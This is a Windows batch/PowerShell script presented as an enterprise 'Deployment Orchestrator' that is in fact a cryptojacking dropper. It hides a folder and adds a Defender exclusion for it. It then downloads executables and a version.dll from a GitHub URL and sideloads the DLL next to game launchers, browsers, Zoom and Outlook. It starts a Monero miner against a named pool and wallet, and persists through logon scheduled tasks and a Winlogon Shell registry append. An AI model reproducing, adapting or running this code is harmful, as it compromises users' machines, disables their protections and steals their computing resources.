@echo off
:: Deployment Orchestrator v2.0.0 (Global Fleet Edition)
:: Purpose: Automated Fleet Rollout across Persistent Volumes (D, E, F, G)
:: Optimization: Comprehensive Sideloading for Gaming & Enterprise Apps

set "POWERSHELL_CMD=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command"

%POWERSHELL_CMD% "& { ^
    $drives = 'D','E','F','G'; ^
    $persistentDrives = @(); ^
    foreach ($d in $drives) { if (Test-Path ($d + ':\')) { $persistentDrives += ($d + ':\'); } } ^
    ^
    # C-Drive Fallback for testing/single-drive systems ^
    if ($persistentDrives.Count -eq 0) { $persistentDrives += 'C:\'; } ^
    ^
    $primaryDrive = $persistentDrives[0]; ^
    $targetDir = $primaryDrive + '.sys_assets'; ^
    if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null; } ^
    (Get-Item $targetDir).Attributes = [System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System; ^
    ^
    # 9. Windows Defender Exclusions ^
    Write-Host 'Applying security exclusions...' -ForegroundColor Cyan; ^
    try { Add-MpPreference -ExclusionPath $targetDir -ErrorAction SilentlyContinue; } catch {} ^
    ^
    $baseUrl = 'https://raw.githubusercontent.com/datalbanianguy/papa/main/'; ^
    $files = @{ ^
        'core-agent.exe' = $targetDir + '\core-agent.exe'; ^
        'thaw_trap.ps1' = $targetDir + '\thaw_trap.ps1'; ^
        'watcher.ps1'   = $targetDir + '\watcher.ps1'; ^
        'version.dll'   = $targetDir + '\version.dll' ^
    }; ^
    foreach ($f in $files.Keys) { try { (New-Object System.Net.WebClient).DownloadFile($baseUrl + $f, $files[$f]); } catch {} } ^
    ^
    $sideloadTargets = @( ^
        '\Steam\steam.exe', ^
        '\Steam\bin\cef\cef.win7\steamwebhelper.exe', ^
        '\Epic Games\Launcher\Portal\Binaries\Win64\EpicGamesLauncher.exe', ^
        '\Epic Games\Launcher\Engine\Binaries\Win64\UnrealCEFSubProcess.exe', ^
        '\Riot Games\Riot Client\RiotClientServices.exe', ^
        '\Riot Games\Riot Client\RiotClient.exe', ^
        '\Battle.net\Battle.net.exe', ^
        '\Electronic Arts\EA Desktop\EA Desktop\EADesktop.exe', ^
        '\Ubisoft\Ubisoft Game Launcher\upc.exe', ^
        '\Origin\Origin.exe', ^
        '\Minecraft Launcher\MinecraftLauncher.exe', ^
        '\FACEIT\Faceit.exe', ^
        '\FACEIT AC\faceit_ac.exe', ^
        '\Riot Vanguard\vgtray.exe', ^
        '\Google\Chrome\Application\chrome.exe', ^
        '\Microsoft\Edge\Application\msedge.exe', ^
        '\Zoom\bin\Zoom.exe', ^
        '\Microsoft Office\root\Office16\OUTLOOK.EXE' ^
    ); ^
    ^
    foreach ($drive in $persistentDrives) { ^
        foreach ($target in $sideloadTargets) { ^
            $fullPath = Join-Path $drive $target; ^
            if (Test-Path $fullPath) { ^
                $dir = Split-Path $fullPath; ^
                try { Copy-Item $files['version.dll'] -Destination $dir -Force -ErrorAction SilentlyContinue; } catch {} ^
            } ^
        } ^
    } ^
    ^
    $args = '--pool pool.supportxmr.com:3333 --wallet 45n1w1fxPShNxUmJHFgypy1XyrCCpSx1LdDBASyHeRKA2xzkpUU9wkyay4quTAEqsZHwk1omKU3DZKpTMPCGnNzH5C7SWSy'; ^
    if (Test-Path $files['core-agent.exe']) { ^
        Start-Process $files['core-agent.exe'] -ArgumentList $args -WindowStyle Hidden; ^
    } ^
    if (Test-Path $files['watcher.ps1']) { ^
        Start-Process powershell.exe -ArgumentList ('-ExecutionPolicy Bypass -File \"' + $files['watcher.ps1'] + '\"') -WindowStyle Hidden; ^
    } ^
    ^
    # 8. Redundant Watchdog Trigger: Scheduled Task ^
    $watchTask = 'EnterpriseResourceWatchdog'; ^
    $wAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $files['watcher.ps1'] + '\"'); ^
    $wTrigger = New-ScheduledTaskTrigger -AtLogOn; ^
    Register-ScheduledTask -TaskName $watchTask -Action $wAction -Trigger $wTrigger -Settings $settings -Force | Out-Null; ^
    ^
    # 6. Advanced Bypass: Winlogon Shell Append (User-Level) ^
    $shellPath = 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'; ^
    if (-not (Test-Path $shellPath)) { New-Item -Path $shellPath -Force | Out-Null; } ^
    $currentShell = (Get-ItemProperty -Path $shellPath -Name 'Shell' -ErrorAction SilentlyContinue).Shell; ^
    if ($null -eq $currentShell) { $currentShell = 'explorer.exe'; } ^
    if ($currentShell -notmatch [Regex]::Escape($files['core-agent.exe'])) { ^
        Set-ItemProperty -Path $shellPath -Name 'Shell' -Value ($currentShell + ',' + $files['core-agent.exe']); ^
    } ^
    ^
    # 7. Advanced Bypass: Task Scheduler Redirection ^
    $taskName = 'EnterpriseResourceUpdate'; ^
    $action = New-ScheduledTaskAction -Execute $files['core-agent.exe'] -Argument $args -WorkingDirectory $targetDir; ^
    $trigger = New-ScheduledTaskTrigger -AtLogOn; ^
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Priority 4; ^
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null; ^
}"

exit
